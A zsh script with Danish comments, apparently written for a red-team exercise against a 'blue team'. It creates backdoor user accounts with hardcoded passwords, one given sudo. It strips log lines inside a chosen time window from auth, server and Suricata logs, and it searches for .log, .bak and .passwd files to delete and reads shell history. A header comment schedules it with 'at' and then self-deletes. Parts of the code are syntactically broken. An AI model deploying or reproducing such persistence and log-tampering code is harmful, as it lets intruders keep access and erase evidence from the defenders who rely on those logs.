#!/usr/bin/env zsh
## Køres med: echo "~/Injection.zsh /dev/null 2>&1" | at $(date -d '+1 minute' '+%H:%M'); "echo rm /Injection.zsh>"
DefaultFormat="DD/MM/YYYY-THH:MM:SS:MSMSMS"
CUser=("Steven" "Bo")
CPasswd=("HackedSteven123" "RegularUserBo123")
CSudo=("True" "False")
Cleanup="False" #Saet til True hvis du vil fjerne brugerne hos blue team for oprydning. 
CountUsers=${#CUser[@]}
CountSudos=0
for I in "${CSudo[@]}"; do
    if [ "$I" = "True" ]; then
            ((CountSudos++))
    fi
done

FullCount=$((CountUsers + CountSudos))
if [[ $Cleanup == "True" ]]; then
    sudo killall -u Steven
    sudo userdel -r Steven
    sudo killall -u Bo
    sudo userdel -r Bo
    exit 1
fi

SplitFunction() {
    DateToSplit=$1
    CorrectedArray=()
    Date="${DateToSplit%Z}"
    Date="${Date%%[+-]*}"
    Date="${Date//T/ }"
    Date="${Date//\// }"
    Date="${Date//-/ }"
    Date="${Date//:/ }"
    Date=("${=Date//./ }")
    local ArrayDate=("${=Date}")
    local First=${ArrayDate[1]}
    local Second=${ArrayDate[2]}
    local Third=${ArrayDate[3]}
    local HH=${ArrayDate[4]}
    local Min=${ArrayDate[5]}
    local SS=${ArrayDate[6]}
    local MSMSMS=${ArrayDate[7]}
    if [[ "$Third" -ge 1000 ]]; then
        Day="$First"
        Month="$Second"
        Year="$Third"
        fi
    elif [[ "$First" -ge 1000 ]]; then
        Day="$Third"
        Month="$Second"
        Year="$First"
    else
        Day="$Second"
        Month="$First"
        Year="$Third"
        fi
    fi
    HH="${HH:-00}"
    MI="${MI:-00}"
    SS="${SS:-00}"
    printf "%02d%02d%04d%02d%02d%02d" "$Day" "$Month" "$Year" "$HH" "$MI" "$SS"
}

EditLogs() {
    local VarFile="$1"
    local StartEditPoint="$2"
    local EndEditPoint="$3"
    DDorMMYYYY=$(grep -Eo "^[0-9]{1,2}(/| |\.|-)[0-9]{1,2}(/| |\.|-)[0-9]{4}(T|:|-)[0-9]{1,2}(:|-)[0-9]{1,2}(:|-)[0-9]{1,2}(:|-|.)[0-9]{1,6}" "$VarFile")
    StartPoint=$(SplitFunction "$StartEditPoint")
    EndPoint=$(SplitFunction "$EndEditPoint")
    local TempFile
    TempFile=$(mktemp)

    ## Chat hjulpet
    local Regex='([0-9]{4}-[0-9]{1,2}-[0-9]{1,2}T[0-9]{2}:[0-9]{2}:[0-9]{2}(\.[0-9]{1,6})?([+-][0-9]{2}:[0-9]{2})?|[0-9]{1,2}[/-][0-9]{1,2}[/-][0-9]{4}[ T-][0-9]{1,2}:[0-9]{1,2}:[0-9]{1,2}(\.[0-9]{1,6})?))'
    while IFS= read -r Linje || [[ -n "$Linje" ]]; do
        if [[ "$Linje" =~ $Regex ]]; then
            LinjeDato="${match[1]}"
            LinjeDato="${LinjeDato## }"
            LinjeDato="${LinjeDato%% }"
            LinjeNr=$(SplitFunction "$LinjeDato")
            ## selv lavet her fra, filtering og regex håndtering har chat hjulpet med
            if (( LinjeNr >= StartPoint && LinjeNr <= EndPoint ));then
                echo "Removing Line: $Linje"
            else
                echo "$Linje" >> "$TempFile"
            fi
        else
            echo "$Linje" >> "$TempFile"
        fi
    done < "$VarFile"
    mv "$TempFile" "$VarFile"
}


CleanUpFunction() {
    #local TargetFiles=("/var/log/suricata/conn.log" "/var/log/suricata/fast.log" "/var/log/suricata/auth.log")
    TargetFiles+=("$@")
    local FoundPaths=()
    for Target in "${TargetFiles[@]}"; do
        local TargetPath=()
        if [[ "$Target" == *.*  ]];then
        TargetPath+=($(sudo find / -type f -name "$Target" 2>/dev/null))
        elif [[ "$Target" == /* ]]; then
            if [[ -e "$Target" ]]; then
                TargetPath+=("$Target")
            elif [[ "$Target" == */* ]]; then
                CleanTarget=$(echo "$Target" | sed 's|^/||; s|/$||')
                TargetDirectorys=($(sudo find / -type d -path "*/$CleanTarget*" 2>/dev/null))
                for Directory in "${TargetDirectorys[@]}"; do
                    FoundPaths+=($(sudo find "$Directory" -maxdepth 1 -type f \( -name "*.log" -o -name "*.bak" -o -name "*.passwd" \) 2>/dev/null))
                done
            else
                echo "didn't catch the folder"
            fi
        else
            echo "didnt catch the drift"
            continue
        fi
        if [[ ${#TargetPath[@]} -gt 0 ]]; then
            FoundPaths+=("${TargetPath[@]}")
        fi
    done

    for Locations in "${FoundPaths[@]}"; do
        if [[ -f "$Locations" ]]; then
            echo "Deleting Target: $Locations"
        elif [[ -d "$Locations" ]]; then
            echo "Deleting Target Dir: $Locations"
        else
            echo "didn't quit catch the drifters here"
        fi
    done
}

CreatingUsers() {
    eval "Users=(\"\${${1}[@]}\")"
    eval "Passwds=(\"\${${2}[@]}\")"
    eval "Sudos=(\"\${${3}[@]}\")"

    for ((i=1; i<=${#Users[@]}; i++)); do
        User="${Users[$i]}"
        Passwd="${Passwds[$i]}"
        SudoFlags="${Sudos[$i]}"

        useradd -m -s "$SHELL" "$User"
        echo "$User:$Passwd" | chpasswd

        if [[ "$SudoFlags" == "True" ]]; then
            usermod -aG sudo "$User"
        fi
    done
}

ClearHistory() {
    TypeOfShell=$(which "$SHELL")
    HistoryFile=$("$TypeOfShell" -ic 'echo $HISTFILE')
    ContentHistory=$("$TypeOfShell" -ic 'cat $HISTFILE')
    echo "Shell: $TypeOfShell and HistoryFile at: $HistoryFile"
    echo "Contents of HistoryFile: \n$ContentHistory"
}
StartEditPoint="01/01/2025-06:00:00.000000" 
EndEditPoint="10/10/2025-18:00:00.000000"
ListOfFiles=(
    "/home/ubuntutarget/Test/TestServer.log"
    "/home/ubuntutarget/Test/TestAuth.log"
    "/home/ubuntutarget/Test/TestSuricata.log"
)

#CreatingUsers CUser CPasswd CSudo
for i in "${ListOfFiles[@]}"; do
    EditLogs "$i"
done
#CleanUpFunction "$@"
#ClearHistory $FullCount